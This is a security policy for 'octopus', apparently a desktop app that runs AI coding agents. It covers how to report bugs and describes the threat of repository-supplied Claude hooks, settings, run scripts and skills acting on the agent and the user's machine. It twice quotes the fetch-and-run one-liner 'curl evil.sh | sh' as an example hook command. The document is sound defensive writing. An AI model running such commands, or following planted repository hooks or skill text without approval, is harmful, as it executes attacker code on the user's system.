# Security

## Reporting

Use **[Report a vulnerability](https://github.com/ytsykvas/octopus/security/advisories/new)**
in the Security tab. It opens a private thread — nothing is disclosed until
there is a fix.

Please do not open a public issue for anything exploitable. Everything else
belongs in the normal [issue tracker](https://github.com/ytsykvas/octopus/issues).

There is one maintainer and no service-level agreement. Expect a first reply
within a week.

## What is worth looking at

Only `main` is supported: there are no releases, and everybody builds from
source.

This is a local desktop application with no backend, no accounts and no network
service of its own — so most of the usual surface does not exist. What does:

- **A repository can attack the agent that opens it.** `.claude/settings.json`
  in a checkout can pre-approve tools and name hook scripts that run on the
  user's machine. `src/core/repoTrust.ts` digests those settings and every file
  under `.claude/hooks/`, and shows them once before any of it is believed. Not
  the scripts the settings _name_: a hook `command` is a shell string, and
  `curl evil.sh | sh` names no file to resolve — so the directory is read whole
  and to the bottom instead, which is a narrower promise the code can keep. A
  link out of the worktree is neither followed nor dropped: where it leads is
  shown and digested, so retargeting it asks again. A way to get settings or a
  hook honoured without that prompt is the most serious bug this project can
  have.
- **A repository can supply the shell the Run button executes.** A checkout
  carrying `.octopus/scripts/` or a `.conductor/` decides what runs, ahead of
  anything configured in the app — so a `git pull` can change it.
  `src/core/repoSource.ts` digests what the repository supplies and shows every
  version once before it runs; a project can be marked trusted, which turns that
  off deliberately and per project. A way to get a repository's script executed
  without either — an approval that survives the script changing, a path that
  resolves outside the checkout, a source that skips the digest — is as serious
  as the item above, and for the same reason.

  **One known limit, stated rather than implied.** A `.conductor` script is a
  command line, not a file, so what is shown and digested is the line: approving
  `./scripts/boot.sh` approves those characters, and a `git pull` rewriting that
  file leaves the digest identical and the approval standing. It cannot be
  closed by following the line — `repoTrust.ts` settled that rule for hooks,
  since `curl evil.sh | sh` names no file, and there is no directory to digest
  whole here. So the promise is narrowed instead: the card says the approval
  covers the line and not what the line runs. A **file**-sourced script
  (`.octopus/scripts/`) is exact, and a report about that one is the serious
  case above.

- **Anything reaching a process argument.** External commands go through
  `execFile` with an argument array, and values crossing IPC are parsed with zod
  at the boundary. A path that reaches an argument unvalidated — branch names
  and project ids come from repository directory names — is worth reporting. The
  one place a string is handed to a shell on purpose is a terminal's
  `commandLine`, which has to reach `zsh -i -c` unquoted to be a command line at
  all; everything about who may write one is the item above.
- **Files written outside `~/.octopus`, the worktree, and `.octopus/` inside a
  project's checkout.** Those three are the whole of what the app is allowed to
  touch. The third is the narrowest and the newest: exporting a project's
  settings writes there and nowhere else, through fixed path constants a test
  checks, and refuses a symbolic link that could redirect the write out of the
  directory. The worktree is held to the same rule: a carried file whose
  destination runs through a link is skipped, and an env file whose does is
  refused — lexical containment is not containment, and a checkout may track a
  symlinked directory. A write that escapes it is worth reporting —
  see [docs/repo-config.md](docs/repo-config.md). This is about **files a
  checkout holds**: git writes under `.git` on the app's behalf whenever it is
  asked to, as `worktree add` and `branch` always have and as the fetch before a
  workspace is created now does, and none of that touches tracked content.
- **The skill stores are working-directory roots.** They have to be: a skill is
  switchable only when the session discovers it the ordinary way, and a local
  plugin's skills cannot be switched off at all. The cost is that
  `~/.octopus/skills` and `~/.octopus/projects/<id>/skills` are directories the
  agent may reach without being handed them again. Reading them is what they are
  for. Writing is not pre-approved: octopus passes only the read-only tool set
  in `allowedTools`, so an `Edit` or a `Write` there is still a permission
  prompt — unless the user has answered "always" for that tool, which is the
  same exposure they already accepted for the worktree. A path that lets the
  agent write into a store **without** a prompt, or that reaches outside the two
  roots, is worth reporting: a skill is prose the agent will later follow, so an
  agent that can rewrite one has written its own next instruction.
- **Importing a skill by URL.** The one place the app fetches something the
  user does not already have on their disk. It is `https` only, checked again
  after the redirects so a hop down to plaintext is refused, capped at 256 KB
  read as the bytes arrive rather than after they are all held, abandoned after
  ten seconds, and it takes **one document** — never a tree, so nothing beside
  the `SKILL.md` is written. What lands is prose the agent may later read, not
  a capability: a skill grants nothing on its own, which is why
  `src/core/repoTrust.ts` leaves prose out of its digest. A way to get this to
  write outside the store, to follow a redirect off `https`, or to pull down
  more than the one document is worth reporting.

## What is not a vulnerability

- **Builds are unsigned.** Deliberate, and the reason there is nothing to
  download; see [docs/releasing.md](docs/releasing.md).
- **The agent can run commands.** That is the product. The question is only ever
  whether the user was asked first.
- **Credentials are not handled here.** `claude` and `gh` keep their own, in the
  keychain. If you find this application storing or reading them, that is a bug
  and very much worth reporting.
